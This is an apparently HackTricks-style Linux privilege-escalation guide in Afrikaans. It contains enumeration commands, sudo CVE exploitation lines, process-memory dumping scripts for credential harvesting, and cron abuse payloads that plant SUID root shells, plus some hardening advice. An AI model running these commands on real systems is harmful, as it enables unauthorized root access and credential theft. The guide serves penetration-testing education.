# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

Vir breër agtergrond en historiese enumerasie-werkvloeie, vergelyk die g0tmi1k-, Payatu-, SANS-, LPE Workshop-, Linux-Privilege-Escalation- en linux-private-i-hulpbronne wat in die verwysings gelys word.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Stelselinligting

### Bedryfstelsel-inligting

Kom ons begin om inligting in te win oor die bedryfstelsel wat loop.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Pad

As jy **skryfregte het op enige vouer in die `PATH`-veranderlike**, kan jy moontlik sommige biblioteke of binaries kaap:

```bash
echo $PATH
```

### Omgewingsinligting

Interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Gaan die kernel-weergawe na en kyk of daar ’n exploit is wat gebruik kan word om voorregte te eskaleer.

Die [Kernel/LPE/CVE-afdeling](../../main-system-information/kernel-lpe-cves/README.md) versamel plaaslike eskalasiegevalle en skakels na die meer diepgaande Linux-kernel-skrywes in Binary Exploitation. Verifieer die betrokke bouweergawe en konfigurasie voordat jy ’n gevallestudie toets.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Jy kan ’n goeie lys van kwesbare kernels en ’n paar reeds **gecompileerde exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Ander webwerwe waar jy ’n paar **gecompileerde exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel-weergawes van daardie webwerf te onttrek, kan jy die volgende doen:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Gereedskap wat kan help om na kernel-exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer dit UIT op die slagoffer; dit kyk net vir exploits vir kernel 2.x)

**Soek altyd die kernel-weergawe op Google**, dalk word jou kernel-weergawe in een of ander kernel-exploit genoem, en dan sal jy seker wees dat die exploit geldig is.

Bykomende kernel-exploitation-tegnieke:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux-regte-eskalasie - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudo-weergawe

Gebaseer op die kwesbare sudo-weergawes wat voorkom in:

```bash
searchsploit sudo
```

Jy kan met hierdie grep nagaan of die sudo-weergawe kwesbaar is.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 tot 1.9.17** laat onbevoorregte plaaslike gebruikers toe om na root te eskaleer via die `--chroot`-opsie wanneer sudo `/etc/nsswitch.conf` vanaf ’n gebruikerbeheerde gids laai; upstream het dit in **1.9.17p1** reggestel. Kontroleer elke uitvoerbare root-setuid sudo-binêr in die betrokke paaie, aangesien `sudo -V` slegs die binêr rapporteer wat deur `PATH` gekies is. Verspreidingspakkette kan die regstelling terugporteer sonder om die upstream-weergawestring te verander, dus moet jy ook die status van die verskaffer se pakket verifieer. Sien die [sudo-onderhouer se advies](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Hier is ’n [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) om daardie [kwesbaarheid](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) uit te buit. Voordat jy die uitbuiting uitvoer, maak seker dat jou `sudo`-weergawe kwesbaar is en die `chroot`-funksie ondersteun.

Vir meer inligting, verwys na die oorspronklike [kwesbaarheidsadvies](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Omseiling van sudo-gasheerreëls (CVE-2025-32462)

Upstream sudo **1.8.8 tot 1.9.17** kan gasheergebaseerde sudoers-reëls evalueer met die **gasheernaam wat deur die gebruiker verskaf is** via `sudo -h <host>` in plaas van die **werklike gasheernaam**; upstream het dit in **1.9.17p1** reggestel. Die gebruiker moet steeds ’n toepaslike sudoers-inskrywing op die gekose gasheer hê. Gaan verskaffer-terugportering en alternatiewe sudo-binêre na, asook die plaaslike beleid. Sien die [sudo-onderhouer se advies](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Vereistes:
- Kwesbare sudo-weergawe
- Gasheerspesifieke sudoers-reëls (die gasheer is nie die huidige gasheernaam of `ALL` nie)

Voorbeeld van ’n sudoers-patroon:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit deur die toegelate host te spoof:

```bash
sudo -h devbox id
sudo -h devbox -i
```

As die resolusie van die gekose naam geblokkeer word, verifieer hoe daardie naam op die gasheer opgelos word. Om bloot ’n naam in ’n loglêer of konfigurasielêer te sien, beteken nie dat dit opgelos kan word nie, en die verandering van `/etc/hosts` vereis normaalweg bevoorregte skryftoegang.

#### sudo < v1.8.28

Hierdie [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) vereis ’n geldende sudo-reël wat ’n opdrag as enige gebruiker toelaat, maar root uitsluit, soos `(ALL, !root) /bin/bash`. Die oproeper moet ook toegelaat word om daardie reël te gebruik, insluitend enige vereiste vir verifikasie. Gaan die geïnstalleerde pakket se sekuriteitsadvies na: verskaffers het die regstelling teruggeporteer na weergawes waarvan die vertoonde upstream-weergawe steeds laer as 1.8.28 is. ’n `!root`-reël of ’n ou weergawe alleen bevestig nie dat die stelsel kwesbaar is nie. Moenie tydens passiewe enumerasie ’n bevoorregte opdrag toets nie.

```
sudo -u#-1 /bin/bash
```

### Dmesg-handtekeningverifikasie het misluk

Kyk na **smasher2 box of HTB** vir ’n **voorbeeld** van hoe hierdie vuln uitgebuit kan word

```bash
dmesg 2>/dev/null | grep "signature"
```

### Meer stelsel-enumerasie

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Lys moontlike verdedigingsmaatreëls

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

As jy binne ’n container is, begin met die volgende afdeling oor container-sekuriteit en pivot dan na die runtime-spesifieke abuse-bladsye:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Aandrywers

Kyk **wat gemount en ontkoppel is**, waar en waarom. As enigiets ontkoppel is, kan jy probeer om dit te mount en na private inligting te soek.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Nuttige sagteware

Lys nuttige binaries

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Kyk ook of **enige compiler geïnstalleer is**. Dit is nuttig as jy ’n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit te compile op die masjien waar jy dit gaan gebruik (of op ’n soortgelyke masjien).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Kwesbare sagteware geïnstalleer

Kyk na die **weergawes van die geïnstalleerde pakkette en dienste**. Daar is dalk ’n ou weergawe van Nagios (byvoorbeeld) wat uitgebuit kan word om voorregte te eskaleer…\
Dit word aanbeveel om die weergawes van die meer verdagte geïnstalleerde sagteware handmatig na te gaan.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk of verouderde en kwesbare sagteware op die masjien geïnstalleer is.

> [!NOTE] > _Let daarop dat hierdie opdragte baie inligting sal wys wat meestal nutteloos sal wees. Daarom word dit aanbeveel om toepassings soos OpenVAS of soortgelyke toepassings te gebruik wat sal kontroleer of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits._

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer voorregte het as wat dit behoort te hê** (dalk word ’n tomcat-proses deur root uitgevoer?)

```bash
ps aux
ps -ef
top -n 1
```

Kyk altyd vir moontlike [**electron/cef/chromium-debuggers** wat loop; jy kan dit misbruik om voorregte te eskaleer](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** spoor hulle op deur die `--inspect`-parameter in die proses se opdragreël na te gaan.\
**Gaan ook jou voorregte op die proses se binaries na**; dalk kan jy iemand s'n oorskryf.

### Ouer-kind-kettings tussen gebruikers

’n Kinderproses wat onder ’n **ander gebruiker** as sy ouerproses loop, is nie outomaties kwaadwillig nie, maar dit is ’n nuttige **sein vir triage**. Sommige oorgange is verwag (`root` wat ’n diensgebruiker laat loop, aanmeldbestuurders wat sessieprosesse skep), maar ongewone kettings kan wrappers, debug helpers, persistence of swak grense vir runtime-vertroue blootlê.

Vinnige nagaan:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

As jy ’n verrassende ketting vind, ondersoek die ouerproses se opdragreël en alle lêers wat die gedrag daarvan beïnvloed (`config`, `EnvironmentFile`, hulpskripte, werkgids, skryfbare argumente). In verskeie werklike privesc-roetes was die kindproses self nie skryfbaar nie, maar die **ouerproses-beheerde config** of hulpketting wel.

### Uitvoerbare lêers wat uitgevee is en oop lêers wat uitgevee is

Runtime-artefakte is dikwels steeds toeganklik **nadat dit uitgevee is**. Dit is nuttig vir voorregte-eskalasie én om bewyse te herwin van ’n proses wat reeds sensitiewe lêers oop het.

Kyk vir uitgevee uitvoerbare lêers:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

As `/proc/<PID>/exe` na `(deleted)` wys, voer die proses steeds die ou binary image uit memory uit. Dit is ’n sterk sein om ondersoek in te stel, want:

- die verwyderde executable kan interessante strings of credentials bevat
- die proses wat loop, kan steeds nuttige file descriptors blootstel
- ’n verwyderde bevoorregte binary kan op onlangse peuterwerk of ’n poging tot opruiming dui

Versamel lêers wat wêreldwyd verwyder is maar steeds oop is:

```bash
lsof +L1
```

As jy ’n interessante descriptor vind, haal dit direk op:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Dit is veral waardevol wanneer ’n proses steeds ’n geskrapte secret, script, databasisuitvoer of flag-lêer oop het.

### Prosesmonitering

Jy kan tools soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer ’n stel vereistes nagekom word.

#### Linux ProcMon onder sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) kan geselekteerde prosesse en stelseloproepe trace en ’n SQLite-trace stoor. As `sudo -l` ’n onbeperkte `procmon`-opdrag toelaat wat as root kan loop, oorweeg of dit ’n ander gebruiker se prosesinvoer of -uitvoer kan waarneem. Die toestemming is slegs ’n leidraad vir verdere ondersoek: ondersteuning vir tracing, die effektiewe beleid en die aktiwiteit van ’n geskikte proses is alles belangrik. Trace-lêers kan secrets bevat, dus inspekteer gemagtigde uitvoere sorgvuldig en vermy dit om onverwante prosesse te versamel.

### Prosesgeheue

Sommige dienste op ’n bediener stoor **credentials in gewone teks binne die geheue**.\
Gewoonlik het jy **root-regte** nodig om die geheue te lees van prosesse wat aan ander gebruikers behoort; daarom is dit gewoonlik nuttiger wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **jy as ’n gewone gebruiker die geheue kan lees van die prosesse wat jy besit**.

> [!WARNING]
> Let daarop dat die meeste masjiene deesdae **ptrace by verstek nie toelaat nie**, wat beteken dat jy nie ander prosesse kan dump wat aan jou onbevoorregte gebruiker behoort nie.
>
> Die lêer _**/proc/sys/kernel/yama/ptrace_scope**_ beheer die toeganklikheid van ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle prosesse kan gedebug word, mits hulle dieselfde uid het. Dit is die klassieke manier waarop ptracing gewerk het.
> - **kernel.yama.ptrace_scope = 1**: slegs ’n ouerproses kan gedebug word.
> - **kernel.yama.ptrace_scope = 2**: slegs ’n admin kan ptrace gebruik, aangesien dit die CAP_SYS_PTRACE-vermoë vereis.
> - **kernel.yama.ptrace_scope = 3**: geen prosesse mag met ptrace getrace word nie. Nadat dit ingestel is, is ’n herlaai nodig om ptracing weer moontlik te maak.

’n Proses met dieselfde UID wat ’n wagwoordkluis kortliks ontsluit, kan ’n afsonderlike credential-grens vorm. Wanneer tracing toegelaat word, kan ’n aktiewe, dumpable proses die kluiswagwoord deur sy invoerstelseloproepe of geheue blootlê, selfs al bly die geënkripteerde kluislêer beskerm. `ptrace_scope=0` is slegs een voorvereiste: ooreenstemmende credentials, die teikenproses se dumpability, ander Linux-sekuriteitsmodules en die proses se leeftyd maak ook saak. Om ’n kluisinskrywing as ’n Unix-root-aanmelding te hergebruik, vereis ’n afsonderlike credential-hergebruikstoets. Roetine-enumerasie behoort die beleid en kandidaatproses- of kluispaaie aan te meld, nie invoer vas te lê of secrets te vertoon nie. Sien die [kernel se Yama-dokumentasie](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) en [ptrace-toegangstoetse](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

As jy toegang tot die geheue van ’n FTP-diens het (byvoorbeeld), kan jy die Heap bekom en daarin na sy credentials soek.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDB-skrip

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Vir ’n gegewe proses-ID wys **maps hoe geheue binne daardie proses se** virtuele adresruimte gekarteer word; dit wys ook die **toestemmings van elke gekarteerde gebied**. Die **mem**-pseudo-lêer **stel die proses se geheue self bloot**. Uit die **maps**-lêer weet ons watter **geheuegebiede leesbaar** is en wat hul offsets is. Ons gebruik hierdie inligting om **na die toepaslike posisies in die mem-lêer te seek en alle leesbare gebiede** na ’n lêer te dump.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan met /dev/kmem verkry word.\
Tipies is `/dev/mem` slegs leesbaar deur **root** en die **kmem**-groep.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump vir linux

ProcDump is ’n Linux-herinterpretasie van die klassieke ProcDump-nutsding uit die Sysinternals-nutsdingstel vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Gereedskap

Om die geheue van ’n proses te dump, kan jy die volgende gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan die root-vereistes handmatig verwyder en die proses dump wat aan jou behoort
- Skrip A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is nodig)

### Geloofsbriewe uit prosesgeheue

#### Handmatige voorbeeld

As jy vind dat die verifikasieproses loop:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Jy kan die proses dump (sien vorige afdelings vir verskillende maniere om die geheue van ’n proses te dump) en binne die geheue na credentials soek:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Die nutsding [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **geloofsbriewe in gewone teks uit die geheue steel** en uit sommige **bekende lêers**. Dit vereis root-voorregte om behoorlik te werk.

| Funksie                                           | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM-wagwoord (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktiewe FTP-verbindings)                  | vsftpd               |
| Apache2 (Aktiewe HTTP Basic Auth-sessies)         | apache2              |
| OpenSSH (Aktiewe SSH-sessies - Sudo-gebruik)      | sshd:                |

#### Soek-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Geskeduleerde/Cron-take

### Crontab UI (alseambusher) wat as root loop – webgebaseerde skeduleerder-privesc

As ’n web-“Crontab UI”-paneel (alseambusher/crontab-ui) as root loop en slegs aan loopback gekoppel is, kan jy dit steeds via SSH local port-forwarding bereik en ’n bevoorregte taak skep om te eskaleer.<sup>[[1]](#references)[[4]](#references)</sup>

Tipiese ketting
- Ontdek ’n poort wat slegs aan loopback gekoppel is (bv. 127.0.0.1:8000) en die Basic-Auth-realm via `ss -ntlp` / `curl -v localhost:8000`
- Vind geloofsbriewe in operasionele artefakte:
  - Rugsteune/skripte met `zip -P <password>`
  - systemd-eenheid wat `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` blootstel
- Stel ’n tonnel op en meld aan:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Skep ’n taak met hoë voorregte en voer dit onmiddellik uit (laat ’n SUID-shell ontstaan):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Gebruik dit:
```bash
/tmp/rootshell -p   # root shell
```

Verharding
- Moenie Crontab UI as root laat loop nie; beperk dit met ’n toegewyde gebruiker en minimale toestemmings
- Bind aan localhost en beperk toegang ook met ’n firewall/VPN; moenie wagwoorde hergebruik nie
- Vermy die insluiting van geheime in unit files; gebruik secret stores of ’n EnvironmentFile wat slegs deur root gelees kan word
- Aktiveer ouditering/registrasie vir werkuitvoerings op aanvraag

Kyk of enige geskeduleerde taak kwesbaar is. Miskien kan jy ’n script wat deur root uitgevoer word, uitbuit (wildcard vuln? Kan jy lêers wysig wat root gebruik? Symlinks gebruik? Spesifieke lêers skep in die gids wat root gebruik?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

As run-parts gebruik word, kontroleer watter name werklik uitgevoer sal word:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

This vermy false positives. ’n Skryfbare periodieke gids is slegs nuttig as jou payload-lêernaam aan die plaaslike `run-parts`-reëls voldoen.

### Cron path

Byvoorbeeld, in _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryfregte oor /home/user het_)

As die root-gebruiker in hierdie crontab ’n opdrag of script probeer uitvoer sonder om die pad in te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy ’n root shell kry deur die volgende te gebruik:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron met 'n script wat 'n wildcard gebruik (Wildcard Injection)

As 'n script deur root uitgevoer word en 'n “**\***” binne 'n command bevat, kan jy dit uitbuit om onverwagte dinge (soos privesc) te doen. Voorbeeld:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**As die wildcard deur ’n pad soos** _**/some/path/\***_ **voorafgegaan word, is dit nie kwesbaar nie (selfs** _**./\***_ **is nie).**

Lees die volgende bladsy vir meer truuks om wildcards uit te buit:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Inspuiting via Bash-rekenkundige uitbreiding in cron-logontleders

Bash-rekenkunde kan onvertroude teks as ’n uitdrukking interpreteer. In sekere Bash-kontekste kan ’n skikkingsindeks binne daardie uitdrukking ’n opdragvervanging evalueer. As ’n bevoorregte cron-ontleder aanvallerbeheerde logteks in so ’n rekenkundige vergelyking plaas, kan die opdragvervanging met die ontleder se identiteit uitgevoer word.<sup>[[22]](#references)</sup> Dit hang af van die presiese Bash-uitdrukking en weergawe; ’n blote `$(...)0`-string in ’n uitgebreide veranderlike is op sigself nie ’n betroubare demonstrasie van her-evaluering nie.

Die invoer kan ook van lêermetadata of ’n ander veld kom wat uit ’n gebruiker-skryfbare plek gelees word. Byvoorbeeld, ’n bevoorregte opruimingskrip wat ’n beeld se `Producer`-merker lees en dit met `[[ "$producer" -eq "expected" ]]` vergelyk, voer ’n rekenkundige vergelyking uit, al is die veranderlike tussen aanhalingstekens. Bepaal watter identiteit die geskeduleerde taak gebruik, watter lêers die merker kan verskaf, watter transformasies voor die vergelyking toegepas word, en wat die presiese Bash-gedrag is. Gebruik ’n stringvergelyking vir teksetikette; vir getalle, bekragtig die invoer as desimale syfers voordat jy rekenkundige bewerkings uitvoer. Sien die [Bash-rekenkundereëls](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Tipiese kwesbare patroon:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Veilige plaaslike gedragstoets vir die array-subscript-meganisme (geen geprivilegieerde proses- of lêerverandering nie):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Traceer die werklike geskeduleerde script en die letterlike invoerpad wat dit oopmaak. Selfs wanneer die loglêer self nie skryfbaar is nie, kan ’n gebruiker wat na die nie-sticky ouergids daarvan kan skryf en daardeur kan navigeer, moontlik die gidsinskrywing vervang; `namei -l` help om hierdie toestemmings te onderskei. ’n Ander skryfbare logpad, ’n onleesbare scheduler of ’n parser wat daardie veld nooit as Bash arithmetic evalueer nie, bewys nie dat hierdie pad bestaan nie.

### Cron-script oorskryf en symlink

As jy **’n cron-script kan wysig** wat deur root uitgevoer word, kan jy baie maklik ’n shell kry:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

As die script wat deur root uitgevoer word ’n **directory gebruik waartoe jy volle toegang het**, kan dit dalk nuttig wees om daardie folder te verwyder en **’n symlink-folder na ’n ander een te skep** wat ’n script bevat wat jy beheer.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Symlink-validering en veiliger lêerhantering

Wanneer bevoorregte skrifte/binêre lêers nagegaan word wat lêers volgens pad lees of skryf, verifieer hoe skakels hanteer word:

- `stat()` volg ’n symlink en gee die teiken se metadata terug.
- `lstat()` gee die metadata van die skakel self terug.
- `readlink -f` en `namei -l` help om die finale teiken op te spoor en die toestemmings van elke padkomponent te wys.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Vir verdedigers/ontwikkelaars sluit veiliger patrone teen symlink-truuks die volgende in:

- `O_EXCL` met `O_CREAT`: misluk as die pad reeds bestaan (blokkeer vooraf geskepte skakels/lêers deur ’n aanvaller).
- `openat()`: werk relatief tot ’n vertroude gidslêerbeskrywer.
- `mkstemp()`: skep tydelike lêers atomies met veilige toestemmings.

### Pasgemaakte ondertekende cron-binêre lêers met skryfbare loonvragte
’n Gewone gebruiker wat die presiese binêre lêer kan skryf wat deur ’n root cron-taak uitgevoer word, kan ’n voorreggrens oorsteek, maar ’n pasgemaakte handtekeningkontrole kan ’n ongetekende plaasvervanger verwerp. In die gedokumenteerde geval was die root-besitte ELF in modus `0760`, wat ’n lid van sy groep toegelaat het om dit te skryf terwyl die root-eienaar dit kon uitvoer. ’n Sigbare prosesnasporing het gewys dat `objcopy` `.text_sig` onttrek het voordat die taak die binêre lêer uitgevoer het; die volledige verifieerderskrip was nie leesbaar nie.<sup>[[2]](#references)</sup>

Die plaasvervanger wat gewerk het, is met gelekte private ondertekeningsmateriaal met behulp van ’n ELF-ondertekenaar onderteken. Sy [formaatdokumentasie](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) beskryf ’n handtekeningafdeling wat van die uitvoerbare lêer se `.text` afgelei word. Daar word nie getoon dat die blote byvoeging van ’n sertifikaat of ’n ooreenstemmende string by `.text_sig` aan die onsigbare verifieerder se vereistes voldoen nie. Gaan die werklike geskeduleerde pad, effektiewe skryftoegang, root-aanroep en verifieerderbeleid na voordat jy besluit dat ’n skryfbare ondertekende binêre lêer uitbuitbaar is. ’n `.text_sig`-afdeling op sigself is slegs ’n leidraad vir hersiening.

### Gereelde cron-take

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy dit uitbuit om voorregte te eskaleer.

Byvoorbeeld, om **elke 0.1s gedurende 1 minuut te monitor**, **volgens die minste uitgevoerde opdragte te sorteer** en die opdragte wat die meeste uitgevoer is, te verwyder, kan jy die volgende doen:

```bash
